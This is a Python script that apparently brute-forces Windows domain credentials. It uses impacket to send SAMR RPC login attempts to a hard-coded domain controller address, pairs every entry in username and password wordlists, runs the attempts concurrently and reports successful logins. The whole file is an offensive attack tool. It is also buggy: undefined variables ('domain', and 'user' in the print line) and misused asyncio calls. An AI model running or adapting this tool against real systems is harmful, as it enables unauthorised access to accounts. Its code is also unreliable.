from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import samr, epm
from impacket.dcerpc.v5 import dtypes
from impacket import nt_errors, ntlm
from impacket.dcerpc.v5.ndr import NULL
import traceback
import asyncio
import functools

dc_ip = '192.168.20.131'


sem = asyncio.Semaphore(50)
task_queue = asyncio.Queue()
result_set = set()
done = False


async def brute_function(username, password):
    binding = epm.hept_map(dc_ip, samr.MSRPC_UUID_SAMR, protocol='ncacn_ip_tcp')

    rpctransport = transport.DCERPCTransportFactory(binding)

    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username, password, domain, lmhash='', nthash='')

    ts = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')

    dce = rpctransport.get_dce_rpc()

    dce.connect()
    dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)

    dce.bind(samr.MSRPC_UUID_SAMR, transfer_syntax=ts)

    request = samr.SamrConnect()

    request['ServerName'] = 'BETO\x00'

    try:
        dce.request(request)
        print("[+]Login Success: %s : %s" %  (user, password))
    except Exception as e:
        traceback.print_exc()


async def main(user, password):
    ## 可以设置回调函数
    async with sem:
        await brute_function(user,password)


def callback(future):
    '''
    asyncio提供的`add_done_callback()`绑定的回调函数只能是普通函数,
    不能是`async`声明的异步函数
    '''
    result_set.remove(future)
    ## 如果是最后一个任务(任务队列已空, 结果集合也空的时候)
    if task_queue.empty() and len(result_set) == 0:
        global done
        done = True


async def customer(loop):
    while not done:
        if task_queue.empty():
            print("[-]等待结束运行")
            await asyncio.sleep(1)
            break
        _username, _password = await task_queue.get()
        future = asyncio.run_coroutine_threadsafe(main(_username, _password), loop)
        future.add_done_callback(callback)
        result_set.add(future)


async def producer():
    """
    获取字典
    :return:
    """
    usernamefile = open(r'user', 'r').readlines()
    passwordfile = open(r'pass', 'r').readlines()
    for i in usernamefile:
        for j in passwordfile:
            print(i.strip(), j.strip())
            await task_queue.put((i.strip(), j.strip()))


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    co = [producer()]
    loop.run_until_complete(asyncio.wait(co))
    co = [customer(loop)]
    loop.run_until_complete(asyncio.wait(co))

